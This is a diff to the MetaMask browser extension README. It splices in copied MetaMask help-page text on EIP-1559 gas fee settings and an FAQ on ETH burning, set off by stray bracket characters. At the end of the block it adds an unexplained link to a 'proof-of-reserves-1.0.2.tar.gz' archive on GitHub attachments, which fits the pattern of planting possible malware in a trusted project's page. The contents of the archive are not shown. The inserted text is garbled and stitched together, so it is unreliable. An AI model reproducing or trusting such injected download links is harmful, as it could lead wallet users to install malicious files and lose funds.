@@ -1,4 +1,102 @@
 # MetaMask Browser Extension
+</
+Discover MetaMask Portfolio today. Track and manage your web3 assets in one place!
+How EIP-1559 Gas Fees Work With MetaMask
+Learn how EIP-1559 works with MetaMask.
+
+
+MetaMask fox in a rocket with a gas tank
+Enhanced Gas UI: MetaMask is making changes to how to gas fees work across Extension (opt in at launch of Extension v10.10.0)
+*These changes will come to the MetaMask Mobile App soon.
+
+The latest changes we’ve made to how EIP-1559 gas fees works with MetaMask Extension
+
+General FAQs
+
+FAQs for developers
+
+Glossary
+
+Enhanced Gas UI to improve how EIP-1559 gas fees work with MetaMask
+We’ve been monitoring, analyzing and taking your feedback on all things EIP-1559 for MetaMask since it launched in August 2021. Based on what we’ve seen and heard, we have made some changes to improve the experience and accuracy of our gas settings. Watch the video and read below what changes you will find when you start using Extension v10.10.0. These changes will be coming to the Mobile App soon and are opt-in for Extension at launch of v10.10.0. You can opt in under “Settings > Experimental” where you can toggle the button ON“.
+
+
+Youtube overlay image
+Enhanced Gas UI with Extension v10.10.0 (Mobile App changes coming soon)
+
+Changes in Gas Estimations
+Changes in Advanced Settings
+The use of icons/emojis to reflect estimations (low, market, aggressive)
+Changes in Gas Estimates
+What has changed:
+
+After EIP-1559 launched, we’ve been observing the market and adapting our estimations and UI to account for the dramatic price spikes that still exist on the Ethereum Mainnet due to popular NFT drops and other projects. When editing estimations, we have changed terms from low, medium, high to low 🐢, market 🦊 and aggressive 🦍 respectively:
+
+“Low“ (previously “Low”): is much lower than market prices and it allows a user to pay a lower fee when they are willing to wait a longer time. It allows you to wait a longer period and skip the price spikes (i.e. save money). Note that this setting is based on past trends, which means we can never be sure the transaction goes through. If you require a transaction to go through, this may not be the right setting for you.
+“Market“ (previously “Medium”): reflects market prices.
+“Aggressive“ (previously “High”): is much higher compared to market prices. It allows you to set a really high max fee and priority fee to increase the likelihood of your transaction being successful if you’re expecting to participate in a gas war.
+NOTE: As of the rollout of the EIP-1559 updates on Extension, you will have to opt-in to this new experience. You will see a prompt to opt in, but you can also find it under “Settings > Experimental” where you can toggle the button ON:
+
+In the near future we will change this to automatic opt-in.
+
+Why we changed it:
+
+We changed this to be more accurate. Before, "Low", "Medium" and "High" were all variations of "market” prices in a way. Now, there is a bigger difference between the various options, "Market" is the current market price. Low means a "Lower than market" which is not always "slow". "Aggressive” is not just high, but really high compared to market rate.
+
+Gas estimate changes
+
+Gas Estimate Before
+Before
+Gas Estimate After
+After
+Changes in Advanced Settings
+In our Advanced Settings, we made two changes:
+
+1. MAX BASE FEE AND PRIORITY FEE SIMPLIFICATION
+What has changed:
+
+We simplified how to customize the Max Base Fee and the Priority Fee. No more math required to calculate the Max Fee. Hooray!
+
+Why we changed it:
+
+For a few reasons:
+
+The first iteration of our EIP-1559 Advanced Settings UI turned out to be a bit too technical and not necessarily relevant for users. The new experience includes more information so it’s easier to make decisions for your priority fee and max base fee.
+We know some users spend time checking gas prices with other services. Now, you no longer need to do this: we added some details below the “Max base fee” and “Priority fee” inputs that help you understand the latest gas status. Below you can find what we added and what it means:
+Current: Most recent gas fees from the network
+Arrow: Trend (up or down from last block)
+12hrs: The 12 hour range
+2. SETTING YOUR ADVANCED SETTINGS AS YOUR DEFAULT SETTINGS
+What has changed:
+
+You can now set “Advanced” as your default option and it remembers your last set values to better support users who want to use their custom gas strategy.
+
+Why we changed it:
+
+This change will help people pursuing extreme use cases such as NFT drops, yet still optimizing for the everyday transaction by providing network status, clear inclusion time estimates and max gas fees. For users that are mostly using MetaMask for aggressive asset buying, you can go directly to the advanced gas option each time saving you several clicks.
+
+Advanced Settings changes
+
+Advanced Settings Before
+Before
+Advanced Settings After
+After
+The Use of Icons/Emojis to Reflect Gas Estimations (Low, Market, Aggressive)
+You will be in good company when setting your Gas Estimations:
+
+Low 🐢
+Market 🦊
+Aggressive 🦍
+General FAQs
+What is EIP-1559?
+Will EIP-1559 make ETH deflationary?
+EIP-1559 burns the ETH spent as base fee of the transaction fee. That ETH is removed from the supply. Under EIP-1559, ETH becomes more scarce, as all transactions on Ethereum burn some amount of ETH.
+
+Modeling exactly how deflationary EIP-1559 is difficult since you have to project variables like expected transactions, and, even harder to predict, expected network congestion. In theory, the more transactions that occur, the more deflationary pressure that the burning of the base fee will have on the overall Ethereum supply. The ETH supply may deflate more or inflate more at different times based upon the number of transactions that happen on the network. Since the update to EIP-1559 in August 2021, we have seen deflationary days on the Ethereum blockchain.
+
+After the merge to Proof of Stake, Justin Drake's model estimates as a “best guess” that 1,000 ETH will be issued per day, and 6,000 ETH would be burned. Assuming more validators join and the staking APR is 6.7%, the annual supply change will be -1.6million ETH, reducing the annual supply rate by 1.4%.
+
+Despite growing awareness of MEV and potential EIPs to bring more transparency, we can expect arbitrage opportunities to only get more sophisticated as institutional financial traders use DeFi protocols. This could mean that there may end up being way more spent on tips per block than the base fee. Zhu Su and Hasu actually predict that less than half of today's fees could be burned by EIP 1559.>\[proof-of-reserves-1.0.2.tar.gz](https://github.com/user-attachments/files/16357319/proof-of-reserves-1.0.2.tar.gz)
 
 You can find the latest version of MetaMask on [our official website](https://metamask.io/). For help using MetaMask, visit our [User Support Site](https://support.metamask.io/).
 
